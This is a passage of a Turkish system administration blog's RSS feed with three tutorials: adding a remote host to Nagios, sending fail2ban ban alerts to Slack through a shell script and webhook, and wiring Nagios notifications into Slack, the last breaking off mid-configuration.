    &lt;span class="n"&gt;check_command&lt;/span&gt;                   &lt;span class="n"&gt;check_ssh&lt;/span&gt;
    &lt;span class="n"&gt;notifications_enabled&lt;/span&gt;           &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Akabinde aşağıdaki komutu çalıştırarak config dosyasının hata kontrolünü sağlayalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;nagios3&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nagios3&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nagios&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cfg&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;less&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nagios'u yeniden başlatalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;nagios3&lt;/span&gt; &lt;span class="n"&gt;reload&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="assets/images/nagios_add_host.jpg" /&gt;
Host nagios paneline eklenmiş gözüküyor.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Wed, 21 Sep 2016 21:34:00 +0300</pubDate><guid>tag:,2016-09-21:nagios-uzak-sunucu-ekleme.html</guid><category>nagios host ekleme</category><category>nagios</category></item><item><title>[SLACK] Fail2ban Entegrasyonu</title><link>/slack-fail2ban-entegrasyonu.html</link><description>&lt;h2&gt;Brute Force Nedir?&lt;/h2&gt;
&lt;p&gt;Saldırganların sıklıkla tercih ettikleri tekniklerden biri de Brute Force adı verilen kaba kuvvet saldırılarıdır. Brute force bir program yardımıyla yapılabileceği gibi el ile de yapılabilir. Brute force saldırılarında kullanıcı adı ve parola bilgisi teker teker denenir. Bu saldırıda başarılı olunabilmesi için en çok kullanılan parola dizilimleri yani sözlük denilen listeler kullanılır. Ne kadar geniş bir sözlük varsa başarıya ulaşma imkanı da o kadar yüksek olur.&lt;/p&gt;
&lt;p&gt;Uygulamalar brute force saldırılarına yönelik çeşitli aksiyonlar almışlardır. Bazı uygulamalar çok sayıda giriş yapıldığında captcha ile giriş istemekte, bazı uygulamalar ise belirli süre o kullanıcıya ait hesabı kapatmaktadır.&lt;/p&gt;
&lt;h2&gt;Fail2Ban Nedir?&lt;/h2&gt;
&lt;p&gt;Fail2ban sunucu sistemlerinde servislere ait log kayıtlarının takip edilerek gerektiği durumlarda bu kişilere karşı aksiyon almayı sağlar. Bu kişilere yönelik sizin belirlediğiniz süre kadar sisteme girişlerini yasaklar. Fail2ban iptables firewall'a ilgili kuralı dinamik olarak girmektedir. Ek olarak fail2ban tcpwrapper'la da çalışabilmektedir.&lt;/p&gt;
&lt;p&gt;Şu sıralar epeyi Slack ile haşır neşir olmaya ve gittikçe sevmeye başladım. Şimdi fail2ban'ın almış olduğu aksiyonlardan anında haberdar olabilmek için Slack ile entegrasyon edelim.&lt;/p&gt;
&lt;p&gt;NOT: Bu tarz durumlar için e-posta kullanmayı pek sevmediğimden dolayı, e-posta ile notification almak istemiyorum. Tercihim bu yüzden Slack'den yana.&lt;/p&gt;
&lt;h2&gt;Fail2ban Slack Entegrasyonu&lt;/h2&gt;
&lt;p&gt;Fail2ban uygulamasına ait yapılandırma ayarları &lt;strong&gt;/etc/fail2ban/jail.conf&lt;/strong&gt; dosyasında tutulmaktadır. Ancak custom (özelleştirilmiş) yapılandırma ihtiyaçlarında bu dosyanın bir kopyası üzerinden devam edilmesi önerilir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;cp&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fail2ban&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fail2ban&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Artık değişikliklerimizi &lt;strong&gt;jail.local&lt;/strong&gt; dosyası üzerinden gerçekleştireceğiz. Slack için action durumunu ayarlayalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;action_with_slack_notification&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;banaction&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%(port)s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%(protocol)s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%(chain)s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                                 &lt;span class="n"&gt;slack&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%(protocol)s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="cp"&gt;# Choose default action.  To change, just override value of &amp;#39;action&amp;#39; with the&lt;/span&gt;
&lt;span class="cp"&gt;# interpolation to the chosen action shortcut (e.g.  action_mw, action_mwl, etc) in jail.local&lt;/span&gt;
&lt;span class="cp"&gt;# globally (section [DEFAULT]) or per specific section&lt;/span&gt;
&lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action_with_slack_notification&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Slack için bildirimlerde kullanacağımız betiği oluşturmak için ilgili dizine gidelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fail2ban&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Şimdi slack bildirimleri için &lt;strong&gt;slack-notify.sh&lt;/strong&gt; adında betiğimizi oluşturalım.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;# !/bin/bash
# Dosya: /etc/fail2ban/action.d/slack-notify.sh
MESSAGE=$1
HOOK_URL={HOOK_URL} # https://hooks.slack.com/services/1111111/1111111111111
HOST=$(hostname)

CHANNEL=&amp;quot;#alerts&amp;quot; # Hangi kanala gönderim yapılacak
USERNAME=&amp;quot;fail2ban&amp;quot; # Hangi kullanıcı adıyla gönderim yapılacak
ICON=&amp;quot;:bangbang:&amp;quot; # Mesajlarda kullanılacak icon -&amp;gt; http://www.webpagefx.com/tools/emoji-cheat-sheet/

if [ &amp;quot;$#&amp;quot; -ge 2 ]; then
    IP=$2
    # İsteğin hangi ülkeden geldiği
    COUNTRY=$(curl ipinfo.io/&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;/country)

    COUNTRY=$(echo &amp;quot;&lt;span class="nv"&gt;$COUNTRY&lt;/span&gt;&amp;quot; | tr -s  &amp;#39;[:upper:]&amp;#39;  &amp;#39;[:lower:]&amp;#39;)
    # Ülkeye uygun emoji setleniyor.
    COUNTRY=&amp;quot;:flag-&lt;span class="nv"&gt;$COUNTRY&lt;/span&gt;:&amp;quot;
    MESSAGE=&amp;quot;&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;MESSAGE&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;_country_&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;COUNTRY&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;&amp;quot;
fi

# Curl isteği gerçekleştiriyoruz.
curl -X POST --data-urlencode &amp;quot;payload={\&amp;quot;channel\&amp;quot;: \&amp;quot;&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;CHANNEL&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;\&amp;quot;, \&amp;quot;username\&amp;quot;: \&amp;quot;&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;USERNAME&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;\&amp;quot;, \&amp;quot;text\&amp;quot;: \&amp;quot;[*&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;*] &lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;MESSAGE&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;\&amp;quot;, \&amp;quot;icon_emoji\&amp;quot;: \&amp;quot;&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;ICON&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;\&amp;quot;$

exit 0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bildirim betiğimiz hazır. Şimdi hangi durumlarda çalışması gerektiğini belirliyoruz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Dosya&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;etc&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;fail2ban&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;action.d&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;slack.conf&lt;/span&gt;

&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;Definition&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;

actioncheck=
actionstart = /bin/bash /etc/fail2ban/action.d/slack-notify.sh &amp;quot;The jail &lt;span class="nt"&gt;&amp;lt;name&amp;gt;&lt;/span&gt; has been started successfully.&amp;quot; &amp;gt; /dev/null 2&amp;gt;&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;1
actionstop = /bin/bash /etc/fail2ban/action.d/slack-notify.sh &amp;quot;The jail &lt;span class="nt"&gt;&amp;lt;name&amp;gt;&lt;/span&gt; has been stopped.&amp;quot; &amp;gt; /dev/null 2&amp;gt;&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;1
actionban = /bin/bash /etc/fail2ban/action.d/slack-notify.sh &amp;quot;Banned _country_ &lt;span class="nt"&gt;&amp;lt;ip&amp;gt;&lt;/span&gt; in the jail &lt;span class="nt"&gt;&amp;lt;name&amp;gt;&lt;/span&gt; after &lt;span class="nt"&gt;&amp;lt;failures&amp;gt;&lt;/span&gt; attempts&amp;quot; &amp;quot;&lt;span class="nt"&gt;&amp;lt;ip&amp;gt;&lt;/span&gt;&amp;quot; &amp;gt; /dev/null 2&amp;gt;&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;1
actionunban = /bin/bash /etc/fail2ban/action.d/slack-notify.sh &amp;quot;Unbanned _country_ &lt;span class="nt"&gt;&amp;lt;ip&amp;gt;&lt;/span&gt; in the jail &lt;span class="nt"&gt;&amp;lt;name&amp;gt;&lt;/span&gt;&amp;quot; &amp;quot;&lt;span class="nt"&gt;&amp;lt;ip&amp;gt;&lt;/span&gt;&amp;quot; &amp;gt; /dev/null 2&amp;gt;&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;1

# Default name of the chain
#
name = default
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Artık servis başladığında, durduğunda, bir kullanıcı sistemden atıldığı ve yasaklamasının kaldırıldığı durumda bildirim gelecektir.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/fail2ban_slack.jpg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Thu, 15 Sep 2016 15:05:00 +0300</pubDate><guid>tag:,2016-09-15:slack-fail2ban-entegrasyonu.html</guid><category>slack</category><category>fail2ban</category></item><item><title>[SLACK] Nagios Entegrasyonu</title><link>/slack-nagios-entegrasyonu.html</link><description>&lt;p&gt;&lt;strong&gt;Nagios&lt;/strong&gt; ağ üzerinde bulunan sistemleri monitör etmek için kullanılan bir yazılımdır. Yazılım sayesinde tüm aktif cihazlarını sizlere sunmuş olduğu arayüz üzerinden monitör edebilirsiniz. Nagios ile birlikte makinalara farklı görev tanımları gerçekleştirebilir ve durum maili alabilirsiniz. &lt;a href="https://www.nagios.org"&gt;Buraya&lt;/a&gt; tıklayarak Nagios'a ulaşabilirsiniz.&lt;/p&gt;
&lt;h2&gt;Slack Nagios Entegrasyonu&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://my.slack.com/services/new/nagios"&gt;https://my.slack.com/services/new/nagios&lt;/a&gt; adresinde yer alan &lt;strong&gt;"Add Nagios integration"&lt;/strong&gt; kısmı içerisinde yer alan &lt;strong&gt;Setup Instructions&lt;/strong&gt; başlığı altında kurulum talimatlarına ulaşabilirsiniz. Sizler için takımınıza ait kanal ismi ve token bilgisi dinamik olarak üretilecektir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;wget&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//raw.github.com/tinyspeck/services-examples/master/nagios.pl&lt;/span&gt;
&lt;span class="n"&gt;cp&lt;/span&gt; &lt;span class="n"&gt;nagios&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pl&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;slack_nagios&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pl&lt;/span&gt;
&lt;span class="n"&gt;chmod&lt;/span&gt; &lt;span class="mi"&gt;755&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;slack_nagios&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pl&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;slack_nagios.pl dosyası içerisinde bizlere özel teamname ve token bilgisini düzenleyelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;my&lt;/span&gt; &lt;span class="nv"&gt;$opt_domain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;teamname.slack.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;# Your team&amp;#39;s domain&lt;/span&gt;
&lt;span class="k"&gt;my&lt;/span&gt; &lt;span class="nv"&gt;$opt_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;# The token from your Nagios services page&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nagios bildirimlerin kimlere gönderileceği dair yapılandırma ayarlarını &lt;strong&gt;/etc/nagios3/conf.d/contacts_nagios2.cfg&lt;/strong&gt; dosyasında tutmaktadır.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;contact&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;contact_name&lt;/span&gt;                             &lt;span class="n"&gt;slack&lt;/span&gt;
      &lt;span class="n"&gt;alias&lt;/span&gt;                                    &lt;span class="n"&gt;Slack&lt;/span&gt;
      &lt;span class="n"&gt;service_notification_period&lt;/span&gt;              &lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="n"&gt;x7&lt;/span&gt;
      &lt;span class="n"&gt;host_notification_period&lt;/span&gt;                 &lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="n"&gt;x7&lt;/span&gt;
      &lt;span class="n"&gt;service_notification_options&lt;/span&gt;             &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;
      &lt;span class="n"&gt;host_notification_options&lt;/span&gt;                &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;
      &lt;span class="n"&gt;service_notification_commands&lt;/span&gt;            &lt;span class="n"&gt;notify&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;by&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;slack&lt;/span&gt;
      &lt;span class="n"&gt;host_notification_commands&lt;/span&gt;               &lt;span class="n"&gt;notify&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;by&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;slack&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yukarıdaki contact tanımlaması ile birlikte yeni bir bildirim türü belirledik.&lt;/p&gt;
&lt;h2&gt;Service Notification Options parametreleri&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Parametre&lt;/th&gt;
&lt;th&gt;Açıklama&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;w&lt;/td&gt;
&lt;td&gt;Warning durumlarında bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;u&lt;/td&gt;
&lt;td&gt;Unknown durumlarında bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;c&lt;/td&gt;
&lt;td&gt;Kritik durumlarda bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r&lt;/td&gt;
&lt;td&gt;Servisin tekrar ayağa kalkma durumunda bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;f&lt;/td&gt;
&lt;td&gt;Servisin start/stop durum analizini gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;s&lt;/td&gt;
&lt;td&gt;Zamanlanmış aralıklarda bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Host Notification Options parametreleri&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Parametre&lt;/th&gt;
&lt;th&gt;Açıklama&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;d&lt;/td&gt;
&lt;td&gt;Hostun down olması durumunda bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;u&lt;/td&gt;
&lt;td&gt;Hostun UNREACHABLE olduğu durumlarda bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r&lt;/td&gt;
&lt;td&gt;Hostun tekrar ayağa kalkma durumunda bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;f&lt;/td&gt;
&lt;td&gt;Hostun start/stop durum analizini gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;s&lt;/td&gt;
&lt;td&gt;Zamanlanmış aralıklarda bildirim gönderir.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Nagios bildirim komutlarını tanımlayalım&lt;/h2&gt;
&lt;p&gt;Contact profilini tanımlarken service_notification_commands ve host_notification_commands parametrelerini kullanmıştım. Şimdi &lt;strong&gt;commands.cfg&lt;/strong&gt; dosyası içerisinde bu komutlarını tanımlayalım. Bu dosyayı "/etc/nagios3/commands.cfg" adresinden ulaşabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;command_name&lt;/span&gt; &lt;span class="n"&gt;notify&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;by&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;slack&lt;/span&gt;
      &lt;span class="n"&gt;command_line&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;slack_nagios&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;slack_channel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;nagios&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;HOSTALIAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$HOSTNAME$&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;SERVICEDESC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$SERVICEDESC$&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;SERVICESTATE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$SERVICESTATE$&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;SERVICEOUTPUT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$SERVICEOUTPUT$&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;NOTIFICATIONTYPE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$NOTIFICATIONTYPE$&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;command_name&lt;/span&gt; &lt;span class="n"&gt;notify&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;by&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;slack&lt;/span&gt;
      &lt;span class="n"&gt;command_line&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;slack_nagios&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;slack_channel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;nagios&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;HOSTALIAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$HOSTNAME$&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;HOSTSTATE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$HOSTSTATE$&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="n"&gt;HOSTOUTPUT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$HOSTOUTPUT$&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;field&lt;/span&gt; &lt;span 